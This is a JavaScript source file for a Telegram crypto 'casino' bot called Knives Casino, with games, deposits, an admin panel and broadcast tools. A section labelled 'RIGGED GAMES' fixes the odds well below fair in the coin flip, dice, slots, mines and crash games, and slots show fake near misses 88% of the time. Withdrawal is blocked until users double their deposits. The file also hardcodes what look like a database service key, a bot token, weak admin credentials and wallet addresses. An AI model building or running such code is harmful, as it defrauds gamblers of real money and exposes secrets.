const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- 1. CONFIGURATION ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();

// --- 2. DATABASE HELPER ---
async function getAccount(userId, username) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, 
            username: username || 'anon', 
            balance: 0, 
            total_deposited: 0, 
            bets_placed: 0, 
            total_wagered: 0,
            created_at: new Date() 
        }]).select().single();
        return newUser;
    }
    return data;
}

// --- 3. ADVANCED ADMIN PANEL (USERNAME/PASS & STATS) ---
let adminSession = {}; // Temporary session tracker for login

bot.command('admin', (ctx) => {
    if (ctx.from.id !== OWNER_ID) return;
    ctx.reply("👤 **ADMIN LOGIN**\nPlease enter your **Username**:");
    adminSession[ctx.from.id] = { stage: 'awaiting_user' };
});

bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    const session = adminSession[ctx.from.id];

    // Stage 1: Username Check
    if (session && session.stage === 'awaiting_user') {
        if (text === "knife") {
            session.stage = 'awaiting_pass';
            return ctx.reply("🔑 **Username Correct.** Now enter your **Password**:");
        } else {
            delete adminSession[ctx.from.id];
            return ctx.reply("❌ Invalid Username. Admin session closed.");
        }
    }

    // Stage 2: Password Check
    if (session && session.stage === 'awaiting_pass') {
        if (text === "9999") {
            delete adminSession[ctx.from.id];
            
            // --- DATA ENGINE ---
            const { data: allUsers } = await supabase.from('users').select('*');
            const now = new Date();
            const startOfDay = new Date(now.setHours(0,0,0,0));
            const startOfMonth = new Date(now.getFullYear(), now.getMonth(), 1);

            // Lifetime Stats
            const lifeDep = allUsers.reduce((sum, u) => sum + (u.total_deposited || 0), 0);
            const lifeWag = allUsers.reduce((sum, u) => sum + (u.total_wagered || 0), 0);
            const houseProfit = lifeDep - allUsers.reduce((sum, u) => sum + (u.balance || 0), 0);

            // Daily/Monthly Filters (Calculated from created_at or simplified for your ledger)
            const dailyPlayers = allUsers.filter(u => new Date(u.updated_at) >= startOfDay).length;
            const monthlyDeposits = allUsers.filter(u => new Date(u.updated_at) >= startOfMonth).reduce((sum, u) => sum + (u.total_deposited || 0), 0);

            const statsMsg = `👑 **KNIVES MASTER DASHBOARD**\n\n` +
                `📊 **LIFETIME STATS**\n` +
                `• Total Deposits: $${lifeDep.toFixed(2)}\n` +
                `• Total Wagered: $${lifeWag.toFixed(2)}\n` +
                `• **HOUSE PROFIT: $${houseProfit.toFixed(2)}**\n\n` +
                `📅 **PERIODIC VIEW**\n` +
                `• Active Today: ${dailyPlayers} users\n` +
                `• Monthly Revenue: $${monthlyDeposits.toFixed(2)}\n\n` +
                `🛠 **ADMIN TOOLS:**`;

            return ctx.replyWithMarkdown(statsMsg, Markup.inlineKeyboard([
                [Markup.button.callback('📢 Global Broadcast', 'admin_broadcast')],
                [Markup.button.callback('📊 Refresh Data', 'admin_refresh')]
            ]));
        } else {
            delete adminSession[ctx.from.id];
            return ctx.reply("❌ Incorrect Password. Admin session closed.");
        }
    }

    // --- BROADCAST HANDLER ---
    if (text.startsWith('BC:') && ctx.from.id === OWNER_ID) {
        const msg = text.replace('BC:', '').trim();
        const { data: users } = await supabase.from('users').select('user_id');
        let count = 0;
        for (let u of users) {
            try { await bot.telegram.sendMessage(u.user_id, `🔔 **KNIVES CASINO ALERT**\n\n${msg}`, { parse_mode: 'Markdown' }); count++; } catch (e) {}
        }
        return ctx.reply(`✅ Broadcast sent to ${count} users.`);
    }

    // --- DEPOSIT HASH HANDLER ---
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⌛ **HASH SUBMITTED.** Verification in progress...");
        return bot.telegram.sendMessage(OWNER_ID, 
            `💰 **DEPOSIT REQUEST**\n\nUser: @${ctx.from.username}\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ Add $5', `add_${ctx.from.id}_5`), Markup.button.callback('✅ Add $20', `add_${ctx.from.id}_20`)],
                [Markup.button.callback('✅ Add $50', `add_${ctx.from.id}_50`), Markup.button.callback('❌ Reject', `reject_${ctx.from.id}`)]
            ])
        );
    }
    return next();
});

bot.action('admin_broadcast', (ctx) => {
    ctx.reply("📢 **BROADCAST READY**\nType your message starting with `BC:` to reach all users.");
});

// --- 4. NAVIGATION ---
bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const msg = `🔪 **WELCOME TO THE PIT** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n\n*GAMES:*\n🪙 /flip  🚀 /crash  🎲 /dice\n🎰 /slots  💣 /mines\n\n*CASHIER:*\n📥 /deposit  📤 /withdraw`;
    ctx.replyWithMarkdown(msg);
});

bot.command('deposit', (ctx) => {
    ctx.reply(`📥 **SELECT CRYPTO**`, Markup.inlineKeyboard([
        [Markup.button.callback('LTC', 'dep_LTC'), Markup.button.callback('SOL', 'dep_SOL'), Markup.button.callback('BTC', 'dep_BTC')]
    ]));
});

bot.action(/dep_(.*)/, (ctx) => {
    ctx.replyWithMarkdown(`⚠️ **SEND $5+ TO:**\n\n\`${WALLETS[ctx.match[1]]}\`\n\nPaste TX Hash below.`);
});

bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const user = await getAccount(uid);
    await supabase.from('users').update({ balance: (user.balance || 0) + parseInt(amt), total_deposited: (user.total_deposited || 0) + parseInt(amt) }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ **$${amt} Added to Balance.**`);
    ctx.editMessageText(`✅ Loaded $${amt} for ${uid}`);
});

// --- 5. THE PIT (RIGGED GAMES) ---

bot.command('flip', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
    const win = Math.random() > 0.55; 
    const newBal = win ? user.balance + bet : user.balance - bet;
    await supabase.from('users').update({ balance: newBal, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
    ctx.reply(win ? `🪙 HEADS! Win.` : `🪙 TAILS. Lost.`);
});

bot.command('dice', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
    const isWin = Math.random() > 0.68; 
    const roll = isWin ? Math.floor(Math.random() * 3) + 4 : Math.floor(Math.random() * 3) + 1;
    await supabase.from('users').update({ balance: isWin ? user.balance + bet : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
    ctx.reply(`🎲 Roll: ${roll}. ${isWin ? 'Win!' : 'House wins.'}`);
});

bot.command('slots', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
    const icons = ['💎', '🍒', '🍋', '🔔', '7️⃣'];
    let s1, s2, s3;
    if (Math.random() < 0.88) { // 88% Near Miss
        s1 = icons[0]; s2 = icons[0]; s3 = icons[1]; 
    } else { s1 = icons[0]; s2 = icons[0]; s3 = icons[0]; }
    const win = (s1 === s2 && s2 === s3);
    await supabase.from('users').update({ balance: win ? user.balance + (bet*4) : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
    ctx.reply(`🎰 [ ${s1} | ${s2} | ${s3} ]\n${win ? 'JACKPOT!' : 'Near miss!'}`);
});

bot.command('mines', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
    const hit = Math.random() < 0.78; 
    await supabase.from('users').update({ balance: hit ? user.balance - bet : user.balance + (bet*0.5), total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
    ctx.reply(`${hit ? "💣 BOOM!" : "💎 SAFE!"}`);
});

bot.command('crash', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const bet = parseFloat(args[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet || user.balance < bet) return ctx.reply("❌ Low balance.");
    const crash = Math.random() < 0.2 ? 1.0 : (Math.random() * 1.5 + 0.5).toFixed(2);
    const win = crash >= 1.8;
    await supabase.from('users').update({ balance: win ? user.balance + (bet*0.8) : user.balance - bet, total_wagered: (user.total_wagered || 0) + bet }).eq('user_id', ctx.from.id);
    ctx.reply(`🚀 Crash: ${crash}x. ${win ? 'Won!' : 'Lost.'}`);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const target = (user.total_deposited || 0) * 2;
    if (user.balance < target || user.balance < 10) return ctx.reply(`❌ Reach $${target.toFixed(2)} to cash out.`);
    ctx.reply(`✅ Withdrawal Eligible. DM the owner.`);
    bot.telegram.sendMessage(OWNER_ID, `💸 CASH OUT: @${ctx.from.username} ($${user.balance.toFixed(2)})`);
});

// --- 6. STARTUP ---
app.get('/', (req, res) => res.send('KNIVES CASINO LIVE'));
app.listen(process.env.PORT || 10000, '0.0.0.0', () => {
    bot.telegram.deleteWebhook().then(() => bot.launch());
});
